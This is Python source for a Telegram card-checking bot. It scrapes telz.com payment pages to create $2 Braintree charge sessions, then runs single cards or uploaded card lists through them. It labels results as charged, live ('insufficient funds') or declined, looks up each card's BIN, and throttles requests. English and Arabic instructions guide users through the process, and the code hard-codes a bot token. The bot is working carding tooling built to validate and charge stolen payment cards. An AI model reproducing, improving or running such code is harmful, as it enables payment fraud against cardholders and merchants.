import telebot
import time
import threading
from telebot import types
import requests, random, json, string,re
from telebot.types import LabeledPrice
from datetime import datetime, timedelta
from us import *
import os
from rag import reg_phone
from bs4 import BeautifulSoup
from reg import *
from Braintree import *
token = '7761272869:AAGhj3801EDcu_mIswxMceOEMiLERm_mThg'
bot = telebot.TeleBot(token, parse_mode="HTML")
admin = 7631724758
stop = {}
stop_flags = {} 
stopuser = {}
command_usage = {}
running_jobs = {}
running_jobs_lock = threading.Lock()
shown_users = set()

@bot.message_handler(commands=["start"])
def start(message):
    user_id = message.from_user.id
    userr = message.from_user.first_name
    username= message.from_user.username
    try:
        if user_id not in shown_users:
        	shown_users.add(user_id)
        	markup = check_subscription()
        	bot.send_message(message.chat.id, 'Join the channel to continue.', reply_markup=markup)
        	return
    except Exception as e:
        bot.send_message(message.chat.id, f"Error checking channel membership:\n{e}")
        return
    IU = f'''Welcome <a href='tg://user?id={user_id}'>{userr}</a> Read The Details and You Will See What They Did. 
 
[<a href="https://t.me/Awmtee">ϟ</a>] Welcome, mr.<a href='tg://user?id={user_id}'>{userr}</a>, Listen carefully and pay close attention so you understand. I am a bot programmed for the Telz app to scan cards on the Braintree Charge gateway. It costs $2.00, and my developer is Kevin the Legend. If you want to run the bot with full privileges and accuracy, please read the terms and conditions below by clicking the buttons below, Dev: @Awmtee . 

[<a href="https://t.me/Awmtee">ϟ</a>] Click The Instructions Button @{username}'''
    FRA=types.InlineKeyboardMarkup(row_width=2)
    Yes22 = types.InlineKeyboardButton('The First Method', callback_data='yrr')
    Noo = types.InlineKeyboardButton('The Second Method', callback_data='noty')
    FRA.add(Yes22,Noo)
    video_url = 'https://t.me/mytricksl/143' 
    bot.send_video(message.chat.id, video_url, caption=IU,parse_mode='HTML', reply_markup=FRA)
@bot.callback_query_handler(func=lambda call: call.data == 'noty')
def Alii(call):
    user_id = call.from_user.id
    userr = call.from_user.first_name
    username= call.from_user.username
    Atty=types.InlineKeyboardMarkup(row_width=1)
    back = types.InlineKeyboardButton("  Back  ", callback_data="start")
    Atty.add(back)
    YTT=f'''Are You <a href='tg://user?id={user_id}'>{userr}</a> Okay, Okay, so you're an idiot. You should contact the developer to understand everything in excruciating detail @Awmtee . 
    	

[<a href="https://t.me/Awmtee">ϟ</a>] Or you should review and understand the first method, Mr. <a href='tg://user?id={user_id}'>{userr}</a> . '''
    bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id, caption=YTT,parse_mode='HTML', reply_markup=Atty)

@bot.callback_query_handler(func=lambda call: call.data == "start")
def back_to_start(call):
    user_id = call.from_user.id
    userr = call.from_user.first_name
    username = call.from_user.username
    IU = f'''Welcome <a href='tg://user?id={user_id}'>{userr}</a> Read The Details and You Will See What They Did. 
 
[<a href="https://t.me/Awmtee">ϟ</a>] Welcome, mr.<a href='tg://user?id={user_id}'>{userr}</a>, Listen carefully and pay close attention so you understand. I am a bot programmed for the Telz app to scan cards on the Braintree Charge gateway. It costs $2.00, and my developer is Awmte the Legend. If you want to run the bot with full privileges and accuracy, please read the terms and conditions below by clicking the buttons below, Dev: @Awmtee . 

[<a href="https://t.me/Awmtee">ϟ</a>] Click The Instructions Button @{username}'''

    FRA = types.InlineKeyboardMarkup(row_width=2)
    Yes22 = types.InlineKeyboardButton('The First Method', callback_data='yrr')
    Noo = types.InlineKeyboardButton('The Second Method', callback_data='noty')
    FRA.add(Yes22, Noo)
    bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id, caption=IU, parse_mode='HTML', reply_markup=FRA)


@bot.callback_query_handler(func=lambda call: call.data == 'yrr')
def Alii2(call):
    user_id = call.from_user.id
    userr = call.from_user.first_name
    username= call.from_user.username
    Atty2=types.InlineKeyboardMarkup(row_width=2)
    ccfui2 = types.InlineKeyboardButton("  Back  ", callback_data="start")
    Atty2.add(ccfui2)
    YTT2=f'''So You're <a href='tg://user?id={user_id}'>{userr}</a> Welcome to the instruction panel. Simply read the instructions carefully to understand them. 
    	
- Instructions in English:


[<a href="https://t.me/Awmtee">1</a>] Register in Telz app . 

[<a href="https://t.me/Awmtee">2</a>] Use /opc with your number and country code . 

[<a href="https://t.me/Awmtee">3</a>] Now write the /surl command with the link you extracted in the second step. If you extracted more than one link, no problem, put the links one under the other .

[<a href="https://t.me/Awmtee">4</a>] Here, Steam will take you to the payment interface. Now, type the command /cc, enter Visa, and check if you want it manually. If it's a combo, just send it and press confirm, and it will be checked clearly . 




- Instructions in Arabic:


[<a href="https://t.me/Awmtee">1</a>]  سجل في تطبيق Telz .

[<a href="https://t.me/Awmtee">2</a>] الان اكتب امر /opc وضع رقمك مع رمز دولتك .

[<a href="https://t.me/Awmtee">3</a>] الان اكتب امر /surl مع الرابط الذي استخرجته في الخطوه الثانيه اما اذا كنت مستخرج اكثر من رابط فلا مشكله ضع الروابط واحده تحت واحده .

[<a href="https://t.me/Awmtee">4</a>] هنا ستيم نقلك لواجه الدفع، والان اكتب امر /cc وضع فيزا وأفحص اذا كنت تريد يدوي واذا كومبو فقط ارسله واضغط تأكيد وسيتم الفحص عليه بشكل واضح .

 '''
    bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id, caption=YTT2,parse_mode='HTML', reply_markup=Atty2)




@bot.callback_query_handler(func=lambda call: call.data == "start")
def back_to_start(call):
    user_id = call.from_user.id
    userr = call.from_user.first_name
    username = call.from_user.username

    IU = f'''Welcome <a href='tg://user?id={user_id}'>{userr}</a> Read The Details and You Will See What They Did. 
 
[<a href="https://t.me/Awmtee">.ϟ</a>] Welcome, mr.<a href='tg://user?id={user_id}'>{userr}</a>, Listen carefully and pay close attention so you understand. I am a bot programmed for the Telz app to scan cards on the Braintree Charge gateway. It costs $2.00, and my developer is Awmtee the Legend. If you want to run the bot with full privileges and accuracy, please read the terms and conditions below by clicking the buttons below, Dev: @Awmtee . 

[<a href="https://t.me/Awmtee">ϟ</a>] Click The Instructions Button @{username}'''

    FRA = types.InlineKeyboardMarkup(row_width=2)
    Yes22 = types.InlineKeyboardButton('Yes', callback_data='yrr')
    Noo = types.InlineKeyboardButton('No', callback_data='noty')
    FRA.add(Yes22, Noo)
    bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id, caption=IU, parse_mode='HTML', reply_markup=FRA)
    




def is_admin(massege):
    return massege.from_user.id == admin
@bot.message_handler(func=lambda m: m.text.lower().startswith('.opc') or m.text.lower().startswith('/opc'))
def ali_al(massege):
    if not is_admin(massege):
        bot.reply_to(massege, "- This is for addictive only! ")
        return
    ko = bot.reply_to(massege, "- Wait checking your number ...").message_id

    try:
        number = massege.reply_to_message.text
    except:
        number = massege.text

    result = reg_phone(number)
    if not result:
        bot.edit_message_text(
            chat_id=massege.chat.id,
            message_id=ko,
            text="""<b>Oops!
Please ensure you enter the number details in the correct format:

Number: +1xxxxxxxxx</b>""",
            parse_mode="HTML"
        )
        return

    number = result 

    session = requests.Session()

    ss = "https://telz.com/cards/bt/pay"
    url = f"https://telz.com/en/pay3?phone={number.replace('+', '%2B')}"

    try:
        req = session.get(url, timeout=15)
        soup = BeautifulSoup(req.text, 'html.parser')

        token_input = soup.find('input', {'name': 'csrfmiddlewaretoken'})
        if not token_input:
            bot.edit_message_text(
                chat_id=massege.chat.id,
                message_id=ko,
                text="CSRF token not found",
                parse_mode="HTML"
            )
            return

        token = token_input['value']

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Referer': url,
            'Origin': 'https://telz.com'
        }

        data = {
            'csrfmiddlewaretoken': token,
            'amount': '2',
            'phone': number,
            'currency': 'USD',
            'vat': '0',
            'first_payment': 'True',
            'method': 'card'
        }

        res = session.post(url, data=data, headers=headers, allow_redirects=False, timeout=15)

        if 'Location' not in res.headers:
            bot.edit_message_text(
                chat_id=massege.chat.id,
                message_id=ko,
                text="No redirect returned from server",
                parse_mode="HTML"
            )
            return

        if 'uuid=' not in res.headers['Location']:
            bot.edit_message_text(
                chat_id=massege.chat.id,
                message_id=ko,
                text="The number is blocked or not registered in the application.",
                parse_mode="HTML"
            )
            return

        uuid = res.headers['Location'].split('uuid=')[1].split('&')[0]
        sd = f"{ss}?uuid={uuid}"

        bot.edit_message_text(
            chat_id=massege.chat.id,
            message_id=ko,
            text=f"URL: <code>{sd}</code>",
            parse_mode="HTML"
        )

    except Exception as e:
        bot.edit_message_text(
            chat_id=massege.chat.id,
            message_id=ko,
            text=f"Error: <code>{e}</code>",
            parse_mode="HTML"
        )




@bot.message_handler(func=lambda m: m.text.lower().startswith('.surl') or m.text.lower().startswith('/surl'))
def ali_al2(massege):
    if not is_admin(massege):
        bot.reply_to(massege, "- This is for addictive only!")
        return

    ko = bot.reply_to(massege, "- Links are being saved ...").message_id
    parts = massege.text.split(maxsplit=1)
    if len(parts) != 2:
        bot.edit_message_text(
            chat_id=massege.chat.id,
            message_id=ko,
            text='''- Please send the link like this:

<code>/surl https://telz.com/cards/bt/pay?uuid=xxxxxxxxxxxx</code>''',
            parse_mode="HTML"
        )
        return

    link = parts[1].strip()
    if not link.startswith("http"):
        bot.edit_message_text(
            chat_id=massege.chat.id,
            message_id=ko,
            text="Invalid link format ❌",
            parse_mode="HTML"
        )
        return

    file_name = "links.txt"
    with open(file_name, "w") as f:
        f.write(link + "\n")

    bot.edit_message_text(
        chat_id=massege.chat.id,
        message_id=ko,
        text="Link saved successfully (old links deleted) ✅",
        parse_mode="HTML"
    )






@bot.message_handler(func=lambda message: message.text.lower().startswith('.cc') or message.text.lower().startswith('/cc'))
def my_ali4(message):
	if not is_admin(message):
		bot.reply_to(message, "- This is for addictive only!")
		return
	name = message.from_user.first_name
	idt=message.from_user.id
	id=message.chat.id
	try:command_usage[idt]['last_time']
	except:command_usage[idt] = {
				'last_time': datetime.now()
			}
	if command_usage[idt]['last_time'] is not None:
		current_time = datetime.now()
		time_diff = (current_time - command_usage[idt]['last_time']).seconds
		if time_diff < 10:
			bot.reply_to(message, f"<b>Try again after {10-time_diff} seconds.</b>",parse_mode="HTML")
			return	
	ko = (bot.reply_to(message, "- Wait checking your card ...").message_id)
	try:
		cc = message.reply_to_message.text
	except:
		cc=message.text
	cc=str(reg(cc))
	if cc == 'None':
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>Oops! 🚫 
Please ensure you enter the card details in the correct format:
Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
		return
	start_time = time.time()
	try:
		command_usage[idt]['last_time'] = datetime.now()
		bran2 = bran
		last = str(bran2(cc))
	except Exception as e:
		last='Error'
		
	end_time = time.time()
	execution_time = end_time - start_time
	msg=f'''<strong>#Braintree_Charge 2.00$ 🔥 [/cc]
- - - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/Awmtee">ϟ</a>] 𝐂𝐚𝐫𝐝: <code>{cc}</code>
[<a href="https://t.me/KEVIN_0x4B65696E">ϟ</a>] 𝐒𝐭𝐚𝐭𝐮𝐬: <code>{'Approved Charge! 🔥' if 'CHARGE 2.00$' in last else 'Approved Braintree! ✅' if 'insufficient funds' in last else 'DECLINED! ❌'}</code>
[<a href="https://t.me/Awmtee">ϟ</a>] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>{last}</code>
- - - - - - - - - - - - - - - - - - - - - - -
{str(dato(cc[:6]))}
- - - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/Awmtee">⌥</a>] 𝐓𝐢𝐦𝐞: <code>{execution_time:.2f}'s</code>
[<a href="https://t.me/Awmtee">⌥</a>] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐛𝐲: <a href='tg://user?id=7237320756'>Ali Check</a> []
- - - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/KEVIN_0x4B65696E">⌤</a>] 𝐃𝐞𝐯 𝐛𝐲: <a href='tg://user?id=6052713305'>Kevin</a> - 🍀</strong>'''

	bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg, parse_mode="HTML")
	
	
	



@bot.message_handler(content_types=('document'))
def GTA(message):
	if not is_admin(message):
		bot.reply_to(message, "- This is for addictive only!")
		return
	user_id = str(message.from_user.id)
	name = message.from_user.first_name or message.from_user.username or "User"

	bts=types.InlineKeyboardMarkup()
	soso=types.InlineKeyboardButton(text='- Braintree Charge 2.00$ 🔥', callback_data='ottpa2')
	bts.add(soso)
	bot.reply_to(message,'Select the type of examination', reply_markup=bts)
	try:
		file_info = bot.get_file(message.document.file_id)
		downloaded = bot.download_file(file_info.file_path)
		filename = f"com{user_id}.txt"
		with open(filename, "wb") as f:
			f.write(downloaded)
	except Exception as e:
		bot.send_message(message.chat.id, f"Error downloading file: {e}")

@bot.callback_query_handler(func=lambda call: call.data == 'ottpa2')
def GTR(call):
	def my_ali():
		user_id = str(call.from_user.id)
		passs = 0
		passsz = 0
		basl = 0
		tote = 0
		filename = f"com{user_id}.txt"
		bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text= "- Please Wait Processing Your File ..")
		with open(filename, 'r') as file:
				lino = file.readlines()
				total = len(lino)
				stopuser.setdefault(user_id, {})['status'] = 'start'
				for cc in lino:
					if stopuser.get(user_id, {}).get('status') == 'stop':
						bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text=f'''The Has Stopped Checker Braintree Charge. 🤓
        
Approved! : {passs}
Declined! : {basl}
Total! : {passs + basl} / {total}
Dev! : @KEVIN_0x4B65696E''')

						return

					try:
						start_time = time.time()
						bran2 = bran
						last = str(bran2(cc))
					except Exception as e:
						print(e)
						last = f"ERROR - {e}"
					mes = types.InlineKeyboardMarkup(row_width=1)
					cm1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
					status = types.InlineKeyboardButton(f"- Status! : {last} •", callback_data='u8')
					cm3 = types.InlineKeyboardButton(f"- Charge! 🔥 : [ {passs} ] •", callback_data='x')
					cm37 = types.InlineKeyboardButton(f"- Approved! ✅ : [ {passsz} ] •", callback_data='x')
					cm4 = types.InlineKeyboardButton(f"- Declined! ❌ : [ {basl} ] •", callback_data='x')
					cm5 = types.InlineKeyboardButton(f"- Total! : [ {total} ] •", callback_data='x')
					stop=types.InlineKeyboardButton("[ Stop Checher! ]", callback_data='stop')
					mes.add(cm1, status, cm3,cm37, cm4, cm5 ,stop)
					end_time = time.time()
					execution_time = end_time - start_time
					bot.edit_message_text(
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    text=f'''- Checker To Braintree Charge 2.00$ ☑️
- Time: {execution_time:.2f}s''',
                    reply_markup=mes
                )
                    
					n = cc.split("|")[0]
					mm = cc.split("|")[1]
					yy = cc.split("|")[2]
					cvc = cc.split("|")[3].strip()
				
					cc = n+'|'+mm+'|'+yy+'|'+cvc
					msg=  f'''<strong>#Braintree_Charge 2.00$ 🔥
- - - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/Awmtee">ϟ</a>] 𝐂𝐚𝐫𝐝: <code>{cc}</code>
[<a href="https://t.me/Awmtee">ϟ</a>] 𝐒𝐭𝐚𝐭𝐮𝐬: <code>{'Approved Charge! 🔥' if 'CHARGE 2.00$' in last else 'Approved Braintree! ✅' if 'insufficient funds' in last else 'DECLINED! ❌'}</code>
[<a href="https://t.me/Awmtee">ϟ</a>] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>{last}</code>
- - - - - - - - - - - - - - - - - - - - - - -
{str(dato(cc[:6]))}
- - - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/Awmtee">⌥</a>] 𝐓𝐢𝐦𝐞: <code>{execution_time:.2f}'s</code>
[<a href="https://t.me/Awmtee">⌥</a>] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐛𝐲: <a href='tg://user?id=7237320756'>Ali Check</a> []
- - - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/KEVIN_0x4B65696E">⌤</a>] 𝐃𝐞𝐯 𝐛𝐲: <a href='tg://user?id=6052713305'>Kevin</a> - 🍀</strong>'''

					if 'CHARGE 2.00$' in last:
						passs += 1
						bot.send_message(call.from_user.id, msg, parse_mode="HTML")
					elif 'insufficient funds' in last:
						passsz += 1
						bot.send_message(call.from_user.id, msg, parse_mode="HTML")
					else:
						basl +=1
					time.sleep(15)


		bot.edit_message_text(
		chat_id=call.message.chat.id, 
		message_id=call.message.message_id,
		text=f'''The Inspection Was Completed By Braintree Charge Pro. 🥳
    
Approved!: {passs}
Declined!: {basl}
Total!: {passs + basl}
Dev!: @KEVIN_0x4B65696E''')
					
						
	my_thread = threading.Thread(target=my_ali)
	my_thread.start()				

@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def menu_callback(call):
    uid = str(call.from_user.id) 
    stopuser.setdefault(uid, {})['status'] = 'stop'
    try:
        bot.answer_callback_query(call.id, "Stopped ✅")
    except:
        pass
        
        
        



def dato(zh):
	try:
		api_url = requests.get("https://bins.antipublic.cc/bins/"+zh).json()
		brand=api_url["brand"]
		card_type=api_url["type"]
		level=api_url["level"]
		bank=api_url["bank"]
		country_name=api_url["country_name"]
		country_flag=api_url["country_flag"]
		mn = f'''[<a href="https://t.me/Awmtee">ϟ</a>] 𝐁𝐢𝐧: <code>{brand} - {card_type} - {level}</code>
[<a href="https://t.me/Awmtee">ϟ</a>] 𝐁𝐚𝐧𝐤: <code>{bank} - {country_flag}</code>
[<a href="https://t.me/Awmtee">ϟ</a>] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country_name} [ {country_flag} ]</code>'''
		return mn
	except Exception as e:
		print(e)
		return 'No info'



print('- Bot was run ..')
while True:
    try:
        bot.infinity_polling(none_stop=True)
    except Exception as e:
        print(f'- Was error : {e}')
        time.sleep(5)
